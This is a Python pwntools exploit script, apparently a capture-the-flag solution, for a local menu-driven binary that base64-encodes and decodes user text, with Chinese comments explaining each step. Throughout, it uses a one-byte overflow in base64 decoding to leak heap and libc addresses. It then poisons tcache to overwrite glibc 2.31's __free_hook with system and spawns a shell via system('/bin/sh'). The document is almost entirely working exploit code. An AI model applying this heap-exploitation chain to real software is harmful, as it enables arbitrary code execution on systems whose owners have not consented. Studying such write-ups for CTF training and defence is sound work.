#!/usr/bin/env python3
from pwn import *
from base64 import b64decode, b64encode
io = process('./pwn')
elf = ELF('./pwn')

context.terminal = ["tmux", "splitw", "-h", "-l", "160"]
# context.log_level = 'debug'


libc=ELF('/home/kali/tools/glibc-all-in-one/libs/2.31_amd64/libc.so.6')
r 		= lambda num			: io.recv(num)
ru		= lambda data			: io.recvuntil(data)
rl		= lambda			: io.recvline()
s 		= lambda data 			: io.send(data)
sl 		= lambda data 			: io.sendline(data)
sa		= lambda data,pay		: io.sendafter(data,pay)
sla		= lambda data,pay		: io.sendlineafter(data,pay)
uu64 		= lambda size			: u64(io.recv(size).ljust(8,b'\x00'))
uu32		= lambda size			: u32(io.recv(size).ljust(4,b'\x00'))
itr 		= lambda 			: io.interactive()
li		= lambda x 			: print('\x1b[01;38;5;214m' + x + '\x1b[0m')
u64_ex		= lambda x : u64(x.ljust(8,b'\x00'))

def mygdb(cmd=''):
    gdb.attach(io,cmd)#brva 0xe93
    pause()

input_after_this = b'Enter your choice:'


def add_en(data):
    sla(input_after_this, b'1')
    sa(b'text', data)


def add_de(data):
    sla(input_after_this, b'2')
    sa(b'text', data)


def dele_en(idx):
    sla(input_after_this, b'3')
    sla(b'idx', str(idx))


def dele_de(idx):
    sla(input_after_this, b'4')
    sla(b'idx', str(idx))


def show_en(idx):
    sla(input_after_this, b'5')
    sla(b'idx', str(idx))


def show_de(idx):
    sla(input_after_this, b'6')
    sla(b'idx', str(idx))

def b64encode1(data):
    tmp = b64encode(data)
    print("len:", hex(len(tmp)))
    return tmp

# mygdb("brva 0x1D1D\nbrva 0x1D6F") #在malloc和debase64下断点
add_de(b64encode(b'a' * 0x36))  # 0x36  dechunk0   0x41
add_de(b64encode(b'c' * 0x24))  #申请堆块 dechunk1  0x31
add_de(b64encode(b'b' * 0x36))  #dechunk2  0x41
add_en(b'a' * 0x400)            #enchunk3  0x571
add_de(b64encode(b'b' * 0x36))  #dechunk4 0x41

dele_en(0)
dele_de(0)
add_de(b64encode(b'\x00' * 0x39)[:-1]) #存在单字节溢出可以控制两个比特位+上0x41

dele_de(3)  #free dechunk4
dele_de(2)  #free dechunk2
dele_de(1)  #free dechunk1  已经被修改为0x41大小的堆块了

add_de(b64encode(b'a' * 0x39)[:-1])  #这个地方需要申请一个刚好0x38的堆块,用来将dechunk2_2和dechunk1_1的数据相连,用来实现连带输出
show_de(1)   #成功实现heap_base内存泄漏

ru(b'a' * 0x38) #接收多余的数据
#mygdb("brva 0x1D1D\nbrva 0x1D6F")
heap_base = u64_ex(ru(b'\n')[:-1]) - 0x81   #泄露出堆块基地址,这个0x81是由于前面的base64编码漏洞造成的,所以减掉
li(hex(heap_base))

dele_de(1)
mygdb("brva 0x1D1D\nbrva 0x1D6F")
add_de(b64encode(b'\x00' * 0x28 + p64(0x21) + p64(heap_base + 0x320))[:-1])   #把chunk修改为0x21大小，并且伪造写一个fd指针到enchunk3的上方的堆块


add_de(b64encode(b'a' * 0x36))
add_de(b64encode(b'a' * 0x30))
show_de(3)                    #通过通过申请到enchunk3的上方堆块,通过连带数据输出,泄露出libc基地址
libc_base = u64_ex(ru(b'\x7f')[-6:]) - 0x1ECBE0
libc.address = libc_base+0x1000

dele_de(2) #free掉这个申请出来的堆块，使bins中多出一个0x21的堆块
add_de(b64encode(p64(0) + p64(0x21)))
dele_de(3) #free掉0x20
dele_de(2) #free掉0x20
dele_de(1) #free掉0x40
# mygdb("brva 0x1D1D\nbrva 0x1D6F")
add_de(b64encode(p64(0x20) * 6 + p64(libc.sym.__free_hook))[:-1])  #将申请出来的堆块不断溢出修改掉0x20堆块的fd指针，使其指向libc的__free_hook

add_de(b64encode(b'/bin/sh\x00'))       #申请一个0x20的堆块，并向其写入/bin/sh字符串
# mygdb("brva 0x1D1D\nbrva 0x1D6F")
add_de(b64encode(p64(libc.sym.system))) #向free_hook写入system函数地址

#launch_gdb(cmd)
# mygdb("brva 0x1FA0")
dele_de(2) #触发free_hook,执行system("/bin/sh")

itr()
